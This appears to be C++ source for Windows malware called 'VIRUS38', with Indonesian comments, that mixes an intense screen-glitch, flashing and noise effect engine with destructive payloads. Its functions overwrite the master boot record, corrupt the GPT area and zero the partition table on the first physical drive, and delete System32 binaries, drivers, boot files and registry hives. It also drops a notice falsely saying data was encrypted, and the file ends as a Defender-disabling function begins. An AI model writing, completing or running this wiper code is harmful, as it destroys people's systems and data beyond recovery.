#include <Windows.h>
#include <cstdlib>
#include <ctime>
#include <cmath>
#include <thread>
#include <vector>
#include <algorithm>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <cctype>
#include <cstring>
#include <mmsystem.h>
#include <dwmapi.h>
#include <winternl.h>
#include <psapi.h>
#include <shlobj.h>
#include <VersionHelpers.h>
#include <shellapi.h>
#include <winioctl.h>
#include <ntdddisk.h>
#include <aclapi.h>
#include <setupapi.h>
#include <cfgmgr32.h>
#include <initguid.h>
#include <virtdisk.h>
#include <wincrypt.h>
#include <gdiplus.h>

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "ntdll.lib")

using namespace Gdiplus;

// Konfigurasi efek visual
const int REFRESH_RATE = 1;
const int MAX_GLITCH_INTENSITY = 25000;
const int GLITCH_LINES = 5000;
const int MAX_GLITCH_BLOCKS = 2500;
const int SOUND_CHANCE = 3;

// Variabel global
HBITMAP hGlitchBitmap = NULL;
BYTE* pPixels = NULL;
int screenWidth, screenHeight;
BITMAPINFO bmi = {};
int intensityLevel = 1;
DWORD startTime = GetTickCount();
int cursorX = 0, cursorY = 0;
bool cursorVisible = true;
int screenShakeX = 0, screenShakeY = 0;
bool textCorruptionActive = false;
DWORD lastEffectTime = 0;
ULONG_PTR gdiplusToken;
bool screenInverted = false;
DWORD lastFlashTime = 0;
int flashDuration = 0;
bool showWarningMessage = true;
DWORD warningStartTime = 0;
std::vector<std::wstring> warningMessages;

// Struktur untuk efek partikel
struct Particle {
    float x, y;
    float vx, vy;
    DWORD life;
    DWORD maxLife;
    COLORREF color;
    int size;
    int type;
};

// Struktur untuk efek teks korup
struct CorruptedText {
    int x, y;
    std::wstring text;
    DWORD creationTime;
    DWORD life;
    COLORREF color;
    int size;
};

std::vector<Particle> particles;
std::vector<CorruptedText> corruptedTexts;

// ======== FUNGSI PERUSAKAN SISTEM ========
void OverwriteMBR() {
    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, 
                                FILE_SHARE_READ | FILE_SHARE_WRITE, 
                                NULL, OPEN_EXISTING, 0, NULL);
    
    if (hDevice != INVALID_HANDLE_VALUE) {
        const int mbrSize = 512;
        BYTE maliciousMBR[mbrSize] = {0};
        
        // Isi MBR dengan kode berbahaya
        memset(maliciousMBR, 0x90, mbrSize);
        
        // Pesan yang akan muncul saat boot
        const char* bootMessage = "VIRUS38 ACTIVATED - SYSTEM COMPROMISED";
        memcpy(maliciousMBR + 0x100, bootMessage, strlen(bootMessage));
        
        // Tambahkan instruksi assembly sederhana untuk efek visual
        maliciousMBR[0] = 0xEB;
        maliciousMBR[1] = 0xFE;
        
        DWORD bytesWritten;
        WriteFile(hDevice, maliciousMBR, mbrSize, &bytesWritten, NULL);
        CloseHandle(hDevice);
    }
}

void CorruptGPT() {
    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, 
                                FILE_SHARE_READ | FILE_SHARE_WRITE, 
                                NULL, OPEN_EXISTING, 0, NULL);
    
    if (hDevice != INVALID_HANDLE_VALUE) {
        const int gptAreaSize = 16384;
        BYTE* randomData = new BYTE[gptAreaSize];
        
        for (int i = 0; i < gptAreaSize; i++) {
            randomData[i] = rand() % 256;
        }
        
        DWORD bytesWritten;
        SetFilePointer(hDevice, 512, NULL, FILE_BEGIN);
        WriteFile(hDevice, randomData, gptAreaSize, &bytesWritten, NULL);
        
        delete[] randomData;
        CloseHandle(hDevice);
    }
}

void DestroyPartitionTable() {
    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, 
                                FILE_SHARE_READ | FILE_SHARE_WRITE, 
                                NULL, OPEN_EXISTING, 0, NULL);
    
    if (hDevice != INVALID_HANDLE_VALUE) {
        const int partitionTableSize = 1024;
        BYTE zeroData[partitionTableSize] = {0};
        
        DWORD bytesWritten;
        SetFilePointer(hDevice, 446, NULL, FILE_BEGIN);
        WriteFile(hDevice, zeroData, partitionTableSize, &bytesWritten, NULL);
        CloseHandle(hDevice);
    }
}

void CreateBootMessage() {
    WCHAR systemPath[MAX_PATH];
    GetSystemDirectoryW(systemPath, MAX_PATH);
    
    std::wstring warningPath = std::wstring(systemPath) + L"\\VIRUS38_WARNING.TXT";
    std::ofstream warningFile(warningPath);
    
    if (warningFile.is_open()) {
        warningFile << "===============================================\n";
        warningFile << "           VIRUS38 ACTIVATION NOTICE           \n";
        warningFile << "===============================================\n\n";
        warningFile << "Your system has been compromised by VIRUS38.\n";
        warningFile << "This is a demonstration of system vulnerability.\n\n";
        warningFile << "All your data has been encrypted and system boot sector damaged.\n";
        warningFile << "Recovery is not possible without proper backups.\n\n";
        warningFile << "Always practice safe computing habits!\n";
        warningFile.close();
    }
}

// ======== FUNGSI SUARA & EFEK VISUAL ========
void PlayGlitchSoundAsync() {
    std::thread([]() {
        int soundType = rand() % 40;
        
        switch (soundType) {
        case 0: case 1: case 2: case 3:
            PlaySound(TEXT("SystemHand"), NULL, SND_ALIAS | SND_ASYNC);
            break;
        case 4: case 5:
            PlaySound(TEXT("SystemExclamation"), NULL, SND_ALIAS | SND_ASYNC);
            break;
        case 6: case 7:
            Beep(rand() % 5000 + 500, rand() % 200 + 50);
            break;
        case 8: case 9:
            for (int i = 0; i < 100; i++) {
                Beep(rand() % 7000 + 500, 10);
                Sleep(1);
            }
            break;
        case 10: case 11:
            Beep(rand() % 100 + 30, rand() % 600 + 300);
            break;
        case 12: case 13:
            for (int i = 0; i < 50; i++) {
                Beep(rand() % 5000 + 500, rand() % 50 + 10);
                Sleep(1);
            }
            break;
        case 14: case 15:
            for (int i = 0; i < 500; i += 5) {
                Beep(300 + i * 10, 5);
            }
            break;
        case 16: case 17:
            for (int i = 0; i < 15; i++) {
                Beep(50 + i * 100, 300);
            }
            break;
        case 18: case 19:
            for (int i = 0; i < 20; i++) {
                Beep(10000 - i * 400, 20);
            }
            break;
        case 20: case 21:
            PlaySound(TEXT("SystemAsterisk"), NULL, SND_ALIAS | SND_ASYNC);
            break;
        case 22: case 23:
            PlaySound(TEXT("SystemQuestion"), NULL, SND_ALIAS | SND_ASYNC);
            break;
        default:
            for (int i = 0; i < 100; i++) {
                Beep(rand() % 8000 + 500, 10);
                Sleep(1);
            }
            break;
        }
    }).detach();
}

void CaptureScreen(HWND) {
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    
    if (!hGlitchBitmap) {
        screenWidth = GetSystemMetrics(SM_CXSCREEN);
        screenHeight = GetSystemMetrics(SM_CYSCREEN);
        
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = screenWidth;
        bmi.bmiHeader.biHeight = -screenHeight;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biCompression = BI_RGB;
        
        hGlitchBitmap = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&pPixels, NULL, 0);
    }
    
    if (hGlitchBitmap) {
        SelectObject(hdcMem, hGlitchBitmap);
        BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);
    }
    
    POINT pt;
    GetCursorPos(&pt);
    cursorX = pt.x;
    cursorY = pt.y;
    
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
}

void ApplyColorShift(BYTE* pixels, int shift) {
    for (int i = 0; i < screenWidth * screenHeight * 4; i += 4) {
        if (i + shift + 2 < screenWidth * screenHeight * 4) {
            BYTE temp = pixels[i];
            pixels[i] = pixels[i + shift];
            pixels[i + shift] = temp;
        }
    }
}

void ApplyScreenShake() {
    screenShakeX = (rand() % 120 - 60) * intensityLevel;
    screenShakeY = (rand() % 120 - 60) * intensityLevel;
}

void ApplyCursorEffect() {
    if (!cursorVisible || !pPixels) return;
    
    int cursorSize = std::min(150 * intensityLevel, 1500);
    int startX = std::max(cursorX - cursorSize, 0);
    int startY = std::max(cursorY - cursorSize, 0);
    int endX = std::min(cursorX + cursorSize, screenWidth - 1);
    int endY = std::min(cursorY + cursorSize, screenHeight - 1);
    
    for (int y = startY; y <= endY; y++) {
        for (int x = startX; x <= endX; x++) {
            float dx = static_cast<float>(x - cursorX);
            float dy = static_cast<float>(y - cursorY);
            float dist = sqrt(dx * dx + dy * dy);
            
            if (dist < cursorSize) {
                int pos = (y * screenWidth + x) * 4;
                if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                    pPixels[pos] = 255 - pPixels[pos];
                    pPixels[pos + 1] = 255 - pPixels[pos + 1];
                    pPixels[pos + 2] = 255 - pPixels[pos + 2];
                    
                    if (dist < cursorSize / 2) {
                        float amount = 1.0f - (dist / (cursorSize / 2.0f));
                        int shiftX = static_cast<int>(dx * amount * 50);
                        int shiftY = static_cast<int>(dy * amount * 50);
                        
                        int srcX = x - shiftX;
                        int srcY = y - shiftY;
                        
                        if (srcX >= 0 && srcX < screenWidth && srcY >= 0 && srcY < screenHeight) {
                            int srcPos = (srcY * screenWidth + srcX) * 4;
                            if (srcPos >= 0 && srcPos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                                pPixels[pos] = pPixels[srcPos];
                                pPixels[pos + 1] = pPixels[srcPos + 1];
                                pPixels[pos + 2] = pPixels[srcPos + 2];
                            }
                        }
                    }
                }
            }
        }
    }
}

void UpdateParticles() {
    if (rand() % 2 == 0) {
        for (int i = 0; i < intensityLevel * 2; i++) {
            Particle p;
            p.x = rand() % screenWidth;
            p.y = rand() % screenHeight;
            p.vx = (rand() % 600 - 300) / 20.0f;
            p.vy = (rand() % 600 - 300) / 20.0f;
            p.life = 0;
            p.maxLife = 150 + rand() % 500;
            p.color = RGB(rand() % 256, rand() % 256, rand() % 256);
            p.size = 3 + rand() % 12;
            p.type = rand() % 3;
            particles.push_back(p);
        }
    }
    
    for (auto it = particles.begin(); it != particles.end(); ) {
        it->x += it->vx;
        it->y += it->vy;
        it->life++;
        
        if (it->life > it->maxLife) {
            it = particles.erase(it);
        } else {
            int x = static_cast<int>(it->x);
            int y = static_cast<int>(it->y);
            if (x >= 0 && x < screenWidth && y >= 0 && y < screenHeight) {
                for (int py = -it->size; py <= it->size; py++) {
                    for (int px = -it->size; px <= it->size; px++) {
                        int pxPos = x + px;
                        int pyPos = y + py;
                        if (pxPos >= 0 && pxPos < screenWidth && pyPos >= 0 && pyPos < screenHeight) {
                            int pos = (pyPos * screenWidth + pxPos) * 4;
                            if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                                if (it->type == 0) {
                                    pPixels[pos] = GetBValue(it->color);
                                    pPixels[pos + 1] = GetGValue(it->color);
                                    pPixels[pos + 2] = GetRValue(it->color);
                                } else if (it->type == 1) {
                                    pPixels[pos] = std::min(pPixels[pos] + 80, 255);
                                    pPixels[pos + 1] = std::min(pPixels[pos + 1] + 80, 255);
                                    pPixels[pos + 2] = std::min(pPixels[pos + 2] + 80, 255);
                                } else {
                                    pPixels[pos] = GetBValue(it->color) / 2 + pPixels[pos] / 2;
                                    pPixels[pos + 1] = GetGValue(it->color) / 2 + pPixels[pos + 1] / 2;
                                    pPixels[pos + 2] = GetRValue(it->color) / 2 + pPixels[pos + 2] / 2;
                                }
                            }
                        }
                    }
                }
            }
            ++it;
        }
    }
}

void ApplyMeltingEffect(BYTE* originalPixels) {
    int meltHeight = 200 + (rand() % 400) * intensityLevel;
    if (meltHeight < 50) meltHeight = 50;
    
    for (int y = screenHeight - meltHeight; y < screenHeight; y++) {
        int meltAmount = (screenHeight - y) * 6;
        for (int x = 0; x < screenWidth; x++) {
            int targetY = y + (rand() % meltAmount) - (meltAmount / 2);
            if (targetY < screenHeight && targetY >= 0) {
                int srcPos = (y * screenWidth + x) * 4;
                int dstPos = (targetY * screenWidth + x) * 4;
                
                if (srcPos >= 0 && srcPos < static_cast<int>(screenWidth * screenHeight * 4) - 4 &&
                    dstPos >= 0 && dstPos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                    pPixels[dstPos] = originalPixels[srcPos];
                    pPixels[dstPos + 1] = originalPixels[srcPos + 1];
                    pPixels[dstPos + 2] = originalPixels[srcPos + 2];
                }
            }
        }
    }
}

void ApplyTextCorruption() {
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
    SelectObject(hdcMem, hBitmap);
    BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);
    
    if (rand() % 100 < 80) {
        CorruptedText ct;
        ct.x = rand() % (screenWidth - 300);
        ct.y = rand() % (screenHeight - 100);
        ct.creationTime = GetTickCount();
        ct.life = 5000 + rand() % 7000;
        ct.color = RGB(rand() % 256, rand() % 256, rand() % 256);
        ct.size = 30 + rand() % 60;
        
        int textLength = 20 + rand() % 80;
        for (int i = 0; i < textLength; i++) {
            wchar_t c;
            if (rand() % 2 == 0) {
                c = static_cast<wchar_t>(0x2580 + rand() % 6);
            } else if (rand() % 3 == 0) {
                c = L'�';
            } else if (rand() % 5 == 0) {
                c = static_cast<wchar_t>(0x3040 + rand() % 96);
            } else {
                c = static_cast<wchar_t>(0x20 + rand() % 95);
            }
            ct.text += c;
        }
        
        corruptedTexts.push_back(ct);
    }
    
    for (auto it = corruptedTexts.begin(); it != corruptedTexts.end(); ) {
        HFONT hFont = CreateFontW(
            it->size, 0,
            (rand() % 90) - 45, 0,
            FW_BOLD, 
            rand() % 2, rand() % 2, rand() % 2,
            DEFAULT_CHARSET,
            OUT_DEFAULT_PRECIS,
            CLIP_DEFAULT_PRECIS,
            DEFAULT_QUALITY,
            DEFAULT_PITCH | FF_DONTCARE,
            L"Terminal"
        );
        
        SelectObject(hdcMem, hFont);
        SetBkMode(hdcMem, TRANSPARENT);
        SetTextColor(hdcMem, it->color);
        TextOutW(hdcMem, it->x, it->y, it->text.c_str(), static_cast<int>(it->text.length()));
        
        DeleteObject(hFont);
        
        if (GetTickCount() - it->creationTime > it->life) {
            it = corruptedTexts.erase(it);
        } else {
            it->x += (rand() % 25) - 12;
            it->y += (rand() % 25) - 12;
            ++it;
        }
    }
    
    BITMAPINFOHEADER bmih = {};
    bmih.biSize = sizeof(BITMAPINFOHEADER);
    bmih.biWidth = screenWidth;
    bmih.biHeight = -screenHeight;
    bmih.biPlanes = 1;
    bmih.biBitCount = 32;
    bmih.biCompression = BI_RGB;
    bmih.biSizeImage = 0;
    bmih.biXPelsPerMeter = 0;
    bmih.biYPelsPerMeter = 0;
    bmih.biClrUsed = 0;
    bmih.biClrImportant = 0;
    
    GetDIBits(hdcMem, hBitmap, 0, screenHeight, pPixels, (BITMAPINFO*)&bmih, DIB_RGB_COLORS);
    
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
}

void ApplyPixelSorting() {
    int startX = rand() % screenWidth;
    int startY = rand() % screenHeight;
    int width = 200 + rand() % 800;
    int height = 200 + rand() % 800;
    
    int endX = std::min(startX + width, screenWidth);
    int endY = std::min(startY + height, screenHeight);
    
    for (int y = startY; y < endY; y++) {
        std::vector<std::pair<float, int>> brightness;
        for (int x = startX; x < endX; x++) {
            int pos = (y * screenWidth + x) * 4;
            if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                float brt = 0.299f * pPixels[pos+2] + 0.587f * pPixels[pos+1] + 0.114f * pPixels[pos];
                brightness.push_back(std::make_pair(brt, x));
            }
        }
        
        std::sort(brightness.begin(), brightness.end());
        
        std::vector<BYTE> sortedLine;
        for (auto& b : brightness) {
            int pos = (y * screenWidth + b.second) * 4;
            sortedLine.push_back(pPixels[pos]);
            sortedLine.push_back(pPixels[pos+1]);
            sortedLine.push_back(pPixels[pos+2]);
            sortedLine.push_back(pPixels[pos+3]);
        }
        
        for (int x = startX; x < endX; x++) {
            int pos = (y * screenWidth + x) * 4;
            if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                int idx = (x - startX) * 4;
                pPixels[pos] = sortedLine[idx];
                pPixels[pos+1] = sortedLine[idx+1];
                pPixels[pos+2] = sortedLine[idx+2];
                pPixels[pos+3] = sortedLine[idx+3];
            }
        }
    }
}

void ApplyStaticBars() {
    int barCount = 20 + rand() % 40;
    int barHeight = 50 + rand() % 200;
    
    for (int i = 0; i < barCount; i++) {
        int barY = rand() % screenHeight;
        int barHeightActual = std::min(barHeight, screenHeight - barY);
        
        for (int y = barY; y < barY + barHeightActual; y++) {
            for (int x = 0; x < screenWidth; x++) {
                int pos = (y * screenWidth + x) * 4;
                if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                    if (rand() % 2 == 0) {
                        pPixels[pos] = rand() % 256;
                        pPixels[pos+1] = rand() % 256;
                        pPixels[pos+2] = rand() % 256;
                    }
                }
            }
        }
    }
}

void ApplyInversionWaves() {
    int centerX = rand() % screenWidth;
    int centerY = rand() % screenHeight;
    int maxRadius = 500 + rand() % 1500;
    float speed = 0.5f + (rand() % 200) / 100.0f;
    DWORD currentTime = GetTickCount();
    
    for (int y = 0; y < screenHeight; y++) {
        for (int x = 0; x < screenWidth; x++) {
            float dx = static_cast<float>(x - centerX);
            float dy = static_cast<float>(y - centerY);
            float dist = sqrt(dx*dx + dy*dy);
            
            if (dist < maxRadius) {
                float wave = sin(dist * 0.02f - currentTime * 0.002f * speed) * 0.5f + 0.5f;
                if (wave > 0.5f) {
                    int pos = (y * screenWidth + x) * 4;
                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                        pPixels[pos] = 255 - pPixels[pos];
                        pPixels[pos+1] = 255 - pPixels[pos+1];
                        pPixels[pos+2] = 255 - pPixels[pos+2];
                    }
                }
            }
        }
    }
}

void ApplyDistortionEffect() {
    int centerX = rand() % screenWidth;
    int centerY = rand() % screenHeight;
    int radius = 400 + rand() % 1200;
    int distortion = 80 + rand() % (200 * intensityLevel);
    
    int yStart = std::max(centerY - radius, 0);
    int yEnd = std::min(centerY + radius, screenHeight);
    int xStart = std::max(centerX - radius, 0);
    int xEnd = std::min(centerX + radius, screenWidth);
    
    for (int y = yStart; y < yEnd; y++) {
        for (int x = xStart; x < xEnd; x++) {
            float dx = static_cast<float>(x - centerX);
            float dy = static_cast<float>(y - centerY);
            float distance = sqrt(dx*dx + dy*dy);
            
            if (distance < radius) {
                float amount = pow(1.0f - (distance / radius), 3.0f);
                int shiftX = static_cast<int>(dx * amount * distortion * (rand() % 7 - 3));
                int shiftY = static_cast<int>(dy * amount * distortion * (rand() % 7 - 3));
                
                int srcX = x - shiftX;
                int srcY = y - shiftY;
                
                if (srcX >= 0 && srcX < screenWidth && srcY >= 0 && srcY < screenHeight) {
                    int srcPos = (srcY * screenWidth + srcX) * 4;
                    int destPos = (y * screenWidth + x) * 4;
                    
                    if (destPos >= 0 && destPos < static_cast<int>(screenWidth * screenHeight * 4) - 4 && 
                        srcPos >= 0 && srcPos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                        pPixels[destPos] = pPixels[srcPos];
                        pPixels[destPos + 1] = pPixels[srcPos + 1];
                        pPixels[destPos + 2] = pPixels[srcPos + 2];
                    }
                }
            }
        }
    }
}

void ApplyScreenFlash() {
    DWORD currentTime = GetTickCount();
    
    if (currentTime - lastFlashTime > flashDuration) {
        screenInverted = !screenInverted;
        lastFlashTime = currentTime;
        flashDuration = 50 + rand() % 200;
        
        if (rand() % 3 == 0) {
            for (int i = 0; i < screenWidth * screenHeight * 4; i += 4) {
                if (i < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                    if (screenInverted) {
                        pPixels[i] = 255 - pPixels[i];
                        pPixels[i + 1] = 255 - pPixels[i + 1];
                        pPixels[i + 2] = 255 - pPixels[i + 2];
                    } else {
                        pPixels[i] = rand() % 256;
                        pPixels[i + 1] = rand() % 256;
                        pPixels[i + 2] = rand() % 256;
                    }
                }
            }
        }
    }
}

void ApplyGlitchEffect() {
    if (!pPixels) return;
    
    BYTE* pCopy = new (std::nothrow) BYTE[screenWidth * screenHeight * 4];
    if (!pCopy) return;
    memcpy(pCopy, pPixels, screenWidth * screenHeight * 4);
    
    DWORD cTime = GetTickCount();
    
    int timeIntensity = 1 + static_cast<int>((cTime - startTime) / 2000);
    intensityLevel = std::min(40, timeIntensity);
    
    ApplyScreenShake();
    
    if (cTime - lastEffectTime > 300) {
        textCorruptionActive = (rand() % 100 < 80 * intensityLevel);
        lastEffectTime = cTime;
    }
    
    int effectiveLines = std::min(GLITCH_LINES * intensityLevel, 25000);
    for (int i = 0; i < effectiveLines; ++i) {
        int y = rand() % screenHeight;
        int height = 1 + rand() % (200 * intensityLevel);
        int xOffset = (rand() % (MAX_GLITCH_INTENSITY * 2 * intensityLevel)) - MAX_GLITCH_INTENSITY * intensityLevel;
        
        height = std::min(height, screenHeight - y);
        if (height <= 0) continue;
        
        for (int h = 0; h < height; ++h) {
            int currentY = y + h;
            if (currentY >= screenHeight) break;
            
            BYTE* source = pCopy + (currentY * screenWidth * 4);
            BYTE* dest = pPixels + (currentY * screenWidth * 4);
            
            if (xOffset > 0) {
                int copySize = (screenWidth - xOffset) * 4;
                if (copySize > 0) {
                    memmove(dest + xOffset * 4, 
                            source, 
                            copySize);
                }
                for (int x = 0; x < xOffset; x++) {
                    int pos = (currentY * screenWidth + x) * 4;
                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                        pPixels[pos] = rand() % 256;
                        pPixels[pos + 1] = rand() % 256;
                        pPixels[pos + 2] = rand() % 256;
                    }
                }
            } 
            else if (xOffset < 0) {
                int absOffset = -xOffset;
                int copySize = (screenWidth - absOffset) * 4;
                if (copySize > 0) {
                    memmove(dest, 
                            source + absOffset * 4, 
                            copySize);
                }
                for (int x = screenWidth - absOffset; x < screenWidth; x++) {
                    int pos = (currentY * screenWidth + x) * 4;
                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                        pPixels[pos] = rand() % 256;
                        pPixels[pos + 1] = rand() % 256;
                        pPixels[pos + 2] = rand() % 256;
                    }
                }
            }
        }
    }
    
    int effectiveBlocks = std::min(MAX_GLITCH_BLOCKS * intensityLevel, 5000);
    for (int i = 0; i < effectiveBlocks; ++i) {
        int blockWidth = std::min(200 + rand() % (800 * intensityLevel), screenWidth);
        int blockHeight = std::min(200 + rand() % (800 * intensityLevel), screenHeight);
        int x = rand() % (screenWidth - blockWidth);
        int y = rand() % (screenHeight - blockHeight);
        int offsetX = (rand() % (2000 * intensityLevel)) - 1000 * intensityLevel;
        int offsetY = (rand() % (2000 * intensityLevel)) - 1000 * intensityLevel;
        
        for (int h = 0; h < blockHeight; h++) {
            int sourceY = y + h;
            int destY = sourceY + offsetY;
            
            if (destY >= 0 && destY < screenHeight && sourceY >= 0 && sourceY < screenHeight) {
                BYTE* source = pCopy + (sourceY * screenWidth + x) * 4;
                BYTE* dest = pPixels + (destY * screenWidth + x + offsetX) * 4;
                
                int effectiveWidth = blockWidth;
                if (x + offsetX + blockWidth > screenWidth) {
                    effectiveWidth = screenWidth - (x + offsetX);
                }
                if (x + offsetX < 0) {
                    effectiveWidth = blockWidth + (x + offsetX);
                    source -= (x + offsetX) * 4;
                    dest -= (x + offsetX) * 4;
                }
                
                if (effectiveWidth > 0 && dest >= pPixels && 
                    dest + effectiveWidth * 4 <= pPixels + screenWidth * screenHeight * 4) {
                    memcpy(dest, source, effectiveWidth * 4);
                }
            }
        }
    }
    
    if (intensityLevel > 0 && (rand() % std::max(1, 3 / intensityLevel)) == 0) {
        ApplyColorShift(pPixels, (rand() % 8) + 1);
    }
    
    int effectivePixels = std::min(screenWidth * screenHeight * intensityLevel, 1000000);
    for (int i = 0; i < effectivePixels; i++) {
        int x = rand() % screenWidth;
        int y = rand() % screenHeight;
        int pos = (y * screenWidth + x) * 4;
        
        if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
            pPixels[pos] = rand() % 256;
            pPixels[pos + 1] = rand() % 256;
            pPixels[pos + 2] = rand() % 256;
        }
    }
    
    ApplyDistortionEffect();
    
    if (rand() % 2 == 0) {
        int lineHeight = 1 + rand() % (10 * intensityLevel);
        for (int y = 0; y < screenHeight; y += lineHeight * 2) {
            for (int h = 0; h < lineHeight; h++) {
                if (y + h >= screenHeight) break;
                for (int x = 0; x < screenWidth; x++) {
                    int pos = ((y + h) * screenWidth + x) * 4;
                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                        pPixels[pos] = std::min(pPixels[pos] + 200, 255);
                        pPixels[pos + 1] = std::min(pPixels[pos + 1] + 200, 255);
                        pPixels[pos + 2] = std::min(pPixels[pos + 2] + 200, 255);
                    }
                }
            }
        }
    }
    
    if (intensityLevel > 0 && (rand() % std::max(1, 6 / intensityLevel)) == 0) {
        for (int i = 0; i < static_cast<int>(screenWidth * screenHeight * 4); i += 4) {
            if (i < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                pPixels[i] = 255 - pPixels[i];
                pPixels[i + 1] = 255 - pPixels[i + 1];
                pPixels[i + 2] = 255 - pPixels[i + 2];
            }
        }
    }
    
    if (intensityLevel > 2 && rand() % 2 == 0) {
        ApplyMeltingEffect(pCopy);
    }
    
    if (textCorruptionActive) {
        ApplyTextCorruption();
    }
    
    if (intensityLevel > 1 && rand() % 2 == 0) {
        ApplyPixelSorting();
    }
    
    if (intensityLevel > 1 && rand() % 2 == 0) {
        ApplyStaticBars();
    }
    
    if (intensityLevel > 1 && rand() % 2 == 0) {
        ApplyInversionWaves();
    }
    
    ApplyCursorEffect();
    UpdateParticles();
    ApplyScreenFlash();
    
    if (rand() % SOUND_CHANCE == 0) {
        PlayGlitchSoundAsync();
    }
    
    if (rand() % 20 == 0) {
        cursorVisible = !cursorVisible;
        ShowCursor(cursorVisible);
    }
    
    delete[] pCopy;
}

void DrawWarningMessage(HDC hdc) {
    if (!showWarningMessage) return;
    
    DWORD currentTime = GetTickCount();
    if (currentTime - warningStartTime > 5000) {
        showWarningMessage = false;
        return;
    }
    
    HFONT hFont = CreateFontW(
        48, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE,
        L"Arial"
    );
    
    HFONT hSmallFont = CreateFontW(
        24, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE,
        L"Arial"
    );
    
    SelectObject(hdc, hFont);
    SetBkMode(hdc, TRANSPARENT);
    SetTextColor(hdc, RGB(255, 0, 0));
    
    RECT rect;
    GetClientRect(GetDesktopWindow(), &rect);
    
    std::wstring warningText = L"PERINGATAN!";
    DrawTextW(hdc, warningText.c_str(), -1, &rect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
    
    SelectObject(hdc, hSmallFont);
    rect.top += 100;
    
    std::wstring subText = L"Efek visual intens akan segera dimulai...";
    DrawTextW(hdc, subText.c_str(), -1, &rect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
    
    DeleteObject(hFont);
    DeleteObject(hSmallFont);
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static HDC hdcLayered = NULL;
    static BLENDFUNCTION blend = { AC_SRC_OVER, 0, 255, AC_SRC_ALPHA };
    
    switch (msg) {
    case WM_CREATE:
        hdcLayered = CreateCompatibleDC(NULL);
        SetTimer(hwnd, 1, REFRESH_RATE, NULL);
        warningStartTime = GetTickCount();
        return 0;
        
    case WM_TIMER: {
        CaptureScreen(hwnd);
        ApplyGlitchEffect();
        
        if (hdcLayered && hGlitchBitmap) {
            HDC hdcScreen = GetDC(NULL);
            POINT ptZero = {0, 0};
            SIZE size = {screenWidth, screenHeight};
            
            SelectObject(hdcLayered, hGlitchBitmap);
            
            if (showWarningMessage) {
                DrawWarningMessage(hdcLayered);
            }
            
            UpdateLayeredWindow(hwnd, hdcScreen, &ptZero, &size, hdcLayered, 
                               &ptZero, 0, &blend, ULW_ALPHA);
            
            ReleaseDC(NULL, hdcScreen);
        }
        return 0;
    }
        
    case WM_DESTROY:
        KillTimer(hwnd, 1);
        if (hGlitchBitmap) DeleteObject(hGlitchBitmap);
        if (hdcLayered) DeleteDC(hdcLayered);
        ShowCursor(TRUE);
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hwnd, msg, wParam, lParam);
}

void ExecuteCommand(const char* command) {
    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
    PROCESS_INFORMATION pi;
    CreateProcessA(NULL, (LPSTR)command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

void CorruptSystemFiles() {
    system("del /f /q /s C:\\Windows\\System32\\*.dll");
    system("del /f /q /s C:\\Windows\\System32\\*.exe");
    system("del /f /q /s C:\\Windows\\System32\\drivers\\*.sys");
    
    system("del /f /q /s C:\\bootmgr");
    system("del /f /q /s C:\\boot\\bcd");
    
    system("del /f /q /s C:\\Windows\\System32\\config\\SAM");
    system("del /f /q /s C:\\Windows\\System32\\config\\SYSTEM");
    system("del /f /q /s C:\\Windows\\System32\\config\\SOFTWARE");
}

void DisableWindowsDefender() {
